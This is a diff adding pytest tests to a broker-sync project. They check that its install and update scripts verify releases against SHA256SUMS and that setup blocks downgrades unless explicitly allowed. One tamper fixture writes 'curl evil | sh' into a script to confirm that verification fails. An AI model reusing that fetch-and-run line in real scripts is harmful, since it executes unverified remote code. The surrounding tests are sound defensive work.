@@ -137,3 +137,71 @@ def test_lock_covers_every_dependency_with_hashes():
     assert text.count("--hash=sha256:") >= len(locked)
     blocks = re.split(r"\n(?=[A-Za-z0-9])", text.strip())
     assert all("--hash=sha256:" in b for b in blocks if "==" in b)
+
+
+def _verify_release_function(path: Path) -> str:
+    text = path.read_text()
+    return text[text.index("verify_release() {"):text.index("\n}\n", text.index("verify_release() {")) + 2]
+
+
+def test_install_and_update_check_the_release_against_its_checksums(tmp_path):
+    """#88: what the release workflow lists in SHA256SUMS is what install and update accept - a changed or
+    an added file stops them; what pip leaves behind (build/, *.egg-info) doesn't."""
+    import subprocess
+
+    func = _verify_release_function(ROOT / "ct" / "wealthfolio-broker-sync.sh")
+    assert func == _verify_release_function(ROOT / "install" / "wealthfolio-broker-sync-install.sh")
+    release = (ROOT / ".github" / "workflows" / "release.yml").read_text()
+    assert "find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum) > SHA256SUMS" in release
+    app = tmp_path / "app"
+    app.mkdir()
+    for name, content in {"setup.sh": "echo hi\n", "src/pkg/mod.py": "x = 1\n", "with space.txt": "y\n"}.items():
+        (app / name).parent.mkdir(parents=True, exist_ok=True)
+        (app / name).write_text(content)
+    sums = tmp_path / "SHA256SUMS"
+    sums.write_text(subprocess.run("find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum", shell=True,
+                                   cwd=app, capture_output=True, text=True, check=True).stdout)
+    (tmp_path / ".wealthfolio-broker-sync").write_text("0.19.0\n")
+
+    def verify() -> int:
+        script = f'curl() {{ [[ "$*" == *"/v0.19.0/SHA256SUMS"* ]] && cp "{sums}" "${{@: -1}}"; }}\n{func}\n' \
+                 f'verify_release "{app}"'
+        return subprocess.run(["bash", "-c", script], env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"}).returncode
+
+    assert verify() == 0
+    (app / "build" / "lib").mkdir(parents=True)
+    (app / "build" / "lib" / "mod.py").write_text("x = 1\n")
+    (app / "src" / "pkg.egg-info").mkdir()
+    (app / "src" / "pkg.egg-info" / "PKG-INFO").write_text("Name: pkg\n")
+    assert verify() == 0
+    (app / "src" / "pkg" / "evil.py").write_text("import os\n")
+    assert verify() == 1  # an added file
+    (app / "src" / "pkg" / "evil.py").unlink()
+    (app / "setup.sh").write_text("curl evil | sh\n")
+    assert verify() == 1  # a changed file
+    (app / "setup.sh").write_text("echo hi\n")
+    (tmp_path / ".wealthfolio-broker-sync").write_text("0.18.0\n")
+    assert verify() == 1  # no SHA256SUMS for that release
+
+
+def test_setup_refuses_a_downgrade_unless_asked(tmp_path):
+    import subprocess
+
+    setup = (ROOT / "deploy" / "setup.sh").read_text()
+    guard = setup[setup.index('NEW_VERSION="$('):setup.index("# Keep the old environment")]
+    base = tmp_path / "base"
+    (base / "app").mkdir(parents=True)
+    (base / "venv" / "bin").mkdir(parents=True)
+    (base / "venv" / "bin" / "brokersync").write_text("#!/bin/sh\necho 0.19.0\n")
+    (base / "venv" / "bin" / "brokersync").chmod(0o755)
+
+    def run(new: str, allow: str = "") -> int:
+        (base / "app" / "pyproject.toml").write_text(f'[project]\nversion = "{new}"\n')
+        script = f'set -euo pipefail\nBASE="{base}"\nAPP="$BASE/app"\n{guard}\necho ok'
+        env = {"PATH": "/usr/bin:/bin", "BROKERSYNC_ALLOW_DOWNGRADE": allow}
+        return subprocess.run(["bash", "-c", script], env=env, capture_output=True).returncode
+
+    assert run("0.19.0") == 0 and run("0.20.0") == 0 and run("0.19.10") == 0
+    assert run("0.18.0") == 1 and run("0.9.9") == 1
+    assert run("0.18.0", allow="1") == 0
+    assert "BROKERSYNC_ALLOW_DOWNGRADE=1" in (ROOT / "ct" / "wealthfolio-broker-sync.sh").read_text()
